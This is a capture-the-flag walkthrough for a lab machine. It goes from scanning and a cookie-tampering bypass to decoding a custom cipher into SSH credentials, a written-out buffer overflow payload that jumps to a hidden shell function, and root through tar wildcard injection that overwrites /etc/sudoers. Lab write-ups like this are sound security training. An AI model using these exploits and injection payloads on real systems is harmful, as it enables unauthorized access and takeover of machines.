# Nmap
Starting with a full  scan, two ports open, SSH on 22 and HTTP on 80. The nmap scan immediately leaks a hidden path from robots.txt, /zYdHuAKjP. This may be our first lead.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bf:17:4f:74:25:be:de:1b:82:1f:b5:d0:4e:8d:fa:24 (RSA)
|   256 d6:69:5b:d5:03:25:cc:49:76:d4:01:b2:2f:4b:c5:10 (ECDSA)
|_  256 8d:c3:eb:57:c0:21:eb:ad:f1:bb:ba:b2:e9:2a:44:54 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/zYdHuAKjP
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Proving Grounds
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Ffuf

The page really doesn't contain anything relevant, so I went straight to looking for directories with ffuf. Ffuf reveals only standard directories, nothing critical.

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.66.142.190/FUZZ
 :: Wordlist         : FUZZ: /SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
css              [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 153ms]
images           [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 2715ms]
js               [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 145ms]
fonts            [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 179ms]
```

# /robots.txt

```html
User-agent: *
Disallow: /zYdHuAKjP
```

Navigating to http://{ip}/zYdHuAKjP returns an "Access Denied" message.

![[Pasted image 20260622175604.png]]

Opening the browser's Developer Tools (F12 --> Storage --> Cookies) reveals a cookie named something like access with the value denied. If i change the cookie value from denied to granted and refresh the page. This grants access to the page, which displays what appears to be a custom cipher
![[Pasted image 20260622182320.png]]

# Decrypting the Cipher

I believe the :: separator strongly suggests the format username::password.

```
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```

Each token consists of two letters with alternating case (e.g. hE, zA, dC). The algorithm works as follows
 
1. Take each pair of letters (e.g. hE)
2. Convert both to lowercase and get their 1-based position in the alphabet: h=8, e=5
3. Sum them:  8 + 5 = 13
4. If the sum is 27, the result is "a" (wrap-around for z+a); otherwise, the result is the letter at position  sum - 1
5.  13 → m


```c
#include <stdio.h>
#include <string.h>
#include <ctype.h>

const char* abc = "abcdefghijklmnopqrstuvwxyz";

int get_index(char c) {
    char *p = strchr(abc, tolower((unsigned char)c));
    if (p) {
        return (int)(p - abc);
    }
    return -1; 
}

void decrypt_part(const char* cipher_part, char* result) {
    int len = strlen(cipher_part);
    int idx = 0;

    for (int i = 0; i < len; i += 2) {
        char sec0 = cipher_part[i];
        char sec1 = cipher_part[i+1];

        if (sec1 == '\0') break; 

        int ch1 = get_index(sec0) + 1;
        int ch2 = get_index(sec1) + 1;
        int s = ch1 + ch2;

        if (s == 27) {
            result[idx++] = 'a';
        } else {
            result[idx++] = abc[s - 1];
        }
    }
    result[idx] = '\0'; 
}

int main() {
    char cipher_raw[] = "hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN";


    char *delim = strstr(cipher_raw, "::");
    if (delim == NULL) {
        printf("Formato incorrecto\n");
        return 1;
    }

    *delim = '\0'; 
    char* cipher_user = cipher_raw;
    char* cipher_pass = delim + 2;

    char user[256] = {0};
    char passwd[256] = {0};

    decrypt_part(cipher_user, user);
    decrypt_part(cipher_pass, passwd);

    printf("%s::%s\n", user, passwd);

    return 0;
}
```

```bash
~> nano decript.c
~> gcc decript.c -o decript
~> ./decript
```

Output:
 
```
magna::getyourowncredentialsbro
```

# ssh

initial access

```bash
ssh magna@{ip}
```


Landing in magna's home directory
```bash
magna@ip-10-66-142-190:~$ ls
flag.txt  hacktheworld  note_from_spooky.txt
magna@ip-10-66-142-190:~$ cat note_from_spooky.txt 
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```

# Buffer Overflow

### Static Analysis with radare2

```bash
r2 hacktheworld
[0x00400570]> aaaa
[0x00400570]> afll
```

The function list reveals two key functions
- main at 0x004006d8
- sym.call_bash at 0x00400657
call_bash is never called from main, it's a hidden function. 
 
```bash
[0x00400570]> s sym.call_bash
[0x00400657]> pdf
```
 
The function calls setuid(1337) followed by system("/bin/sh"), a shell running as user spooky (UID 1337). Our goal is to redirect execution here.

## Finding the Buffer Offset


The binary uses "gets()" in "main", which is inherently unsafe, it reads input without bounds checking, making it vulnerable to a stack buffer overflow.
 
Finding the offset by trial and error
 
```bash
python -c 'print "D"*70' | ./hacktheworld   # No crash
python -c 'print "D"*72' | ./hacktheworld   # Segfault
```
 
Offset 72 bytes before we overwrite the return address.

## Building the Exploit

The address of call_bash is 0x00400657. In little-endian format (x86-64)
 
```
\x57\x06\x40\x00\x00\x00\x00\x00
```
 
The full exploit
 
```bash
python -c 'print "D"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00"' | ./hacktheworld
```
 
This triggers the function, but the shell closes immediately because stdin is EOF. To keep it open, we pipe cat alongside
 
```bash
(python -c 'print "D"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./hacktheworld
```
 
Now we have an interactive shell as spooky
 
```bash
whoami
spooky
```
 
Stabilize it
 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Lateral Movement

The second flag is in `flag.txt`. The suspicious files with `--checkpoint` in their names are the clue for privilege escalation.

```bash
cd /home/spooky
ls
```
 
```
'--checkpoint=1'
'--checkpoint-action=exec=sh shell.sh'
flag.txt
shell.sh
```
 

# Privilege Escalation

There's a cron job running as root that periodically backs up the contents of /home/spooky using tar with a wildcard
 
```bash
tar cf /var/backups/backup.tar *
```
 
When tar expands the " * "wildcard, it picks up all filenames in the directory, including filenames that look like command-line arguments.
 
The files already present in spooky's home (--checkpoint=1 and --checkpoint-action=exec=sh shell.sh) are specially crafted to be interpreted as tar flags when the cron job runs.
  
First, create the malicious payload in shell.sh
 
```bash
echo 'echo "spooky ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > shell.sh
```
 
Then create the "argument files" that tar will interpret as flags
 
```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
 
When the cron job runs, tar executes
 
```bash
tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh flag.txt
```
 
At the checkpoint, it runs shell.sh as root, which overwrites /etc/sudoers to give spooky unrestricted sudo access.
 
Wait roughly a minute for the cron job to fire, and then...
 
```bash
sudo bash
whoami
# root
```
 
